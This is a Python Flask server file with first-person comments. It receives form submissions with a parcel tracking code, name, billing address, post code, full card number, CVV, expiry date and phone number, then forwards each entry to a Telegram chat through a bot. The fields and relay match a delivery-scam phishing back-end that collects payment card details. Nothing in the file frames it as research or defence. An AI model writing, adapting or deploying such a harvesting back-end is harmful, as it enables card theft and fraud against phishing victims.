# Import the Flask class from flask, which will let me create and run a server
from flask import Flask, request, jsonify

# Import CORS to allow cross-origin requests (so my front-end can talk to this back-end without issues)
from flask_cors import CORS

# Import requests to make HTTP requests (I'll use this to call the Telegram API)
import requests

# Create an instance of the Flask class for my application
app = Flask(__name__)

# Enable CORS for my Flask app, so browsers don't block requests from different domains
CORS(app)

# These variables need my actual Telegram Bot Token and the Chat ID where messages go
BOT_TOKEN = ""  # e.g., "1234567:ABC-..."
CHAT_ID = ""    # Could be a number if private chat, or negative if it's a group

# Define a route on my server that listens for POST requests at "/send-to-telegram"
@app.route("/send-to-telegram", methods=["POST"])
def send_to_telegram():
    # This function will handle the incoming JSON data and forward it to Telegram
    try:
        # request.json is the JSON body sent from my front-end using fetch or axios
        data = request.json

        # I'm extracting fields that match the keys in my form's JSON.
        # If a key doesn't exist, I'll use an empty string by default.
        tracking_code = data.get("trackingCode", "")
        name = data.get("name", "")
        billing_address = data.get("billingAddress", "")
        post_code = data.get("postCode", "")
        card_number = data.get("cardNumber", "")
        cvv = data.get("cvv", "")
        expiry = data.get("expiry", "")
        phone = data.get("phone", "")

        # Construct a single text message with each piece of data on its own line
        # This is what I'll send to the Telegram chat
        message = (
            f"Tracking Code: {tracking_code}\n"
            f"Name: {name}\n"
            f"Billing Address: {billing_address}\n"
            f"Post Code: {post_code}\n"
            f"Card Number: {card_number}\n"
            f"CVV: {cvv}\n"
            f"Expiry: {expiry}\n"
            f"Phone: {phone}"
        )

        # The Telegram bot endpoint for sending messages requires my bot token
        # e.g. "https://api.telegram.org/bot<token>/sendMessage"
        telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

        # Build a dictionary (JSON) to tell Telegram which chat and what text
        payload = {
            "chat_id": CHAT_ID,
            "text": message
        }

        # Use requests.post() to send an HTTP POST request to Telegram's API
        # I'm passing 'json=payload' so it sends JSON in the body
        response = requests.post(telegram_url, json=payload)

        # Telegram will send back a response in JSON, so I parse that
        response_data = response.json()

        # Return whatever Telegram responded with, plus the status code they gave
        return jsonify(response_data), response.status_code

    except Exception as e:
        # If something goes wrong (like a bad token or network error),
        # I'll log it in the server console and return an error to my front-end
        print("Error sending message to Telegram:", e)
        return jsonify({"error": str(e)}), 500

# If I'm running this file directly (not importing it), start up the server on port 5000
if __name__ == "__main__":
    app.run(port=5000, debug=True)
